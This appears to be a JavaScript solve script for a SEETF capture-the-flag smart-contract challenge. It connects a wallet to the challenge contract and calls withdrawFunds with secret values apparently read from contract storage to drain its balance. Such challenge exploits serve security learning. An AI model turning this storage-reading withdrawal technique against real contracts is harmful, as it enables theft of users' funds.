const { ethers, BigNumber } = require("ethers");
const Web3 = require("web3");
const web3 = new Web3();

const ABI = require("./ABI.json");
const provider = new ethers.providers.JsonRpcProvider(
    "http://awesome.chall.seetf.sg:40002"
);
const contractAddress = "0xbee67411cA75a5a8325D25a302B7D07CD5264c3b";
const contract = new ethers.Contract(contractAddress, ABI, provider);
const privateKey = "REDACTED";
const wallet = new ethers.Wallet(privateKey, provider)
const contractWithSigner = contract.connect(wallet);

const hex_to_dec = _hex => {
    return parseInt(_hex, 16);
}

const hex_to_ascii = _hex => {
    const hex = _hex.toString();
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
}

const contractInteraction = async() => {

    // const thirdtx = await contract.timestamp();
    // console.log(hash);
    // const secondtx = await provider.getStorageAt(contractAddress, 2);
    const fourthtx = await contractWithSigner.withdrawFunds(BigNumber.from("0x01a02ead5e5f0dfd77"), ethers.utils.formatBytes32String("Wayyang"), ethers.utils.formatBytes32String("Cute"), 1654324648);
    // console.log(fourthtx);
    const secondtx = await contract.balanceOf("0xbee67411cA75a5a8325D25a302B7D07CD5264c3b");
    console.log(secondtx);
    const lastTx = await contract.balanceOf("REDACTED");
    console.log(ethers.utils.formatEther(lastTx));
}

contractInteraction();
// console.log(ethers.utils.formatBytes32String("Wayyang"));
// console.log(ethers.utils.formatBytes32String("Cute"));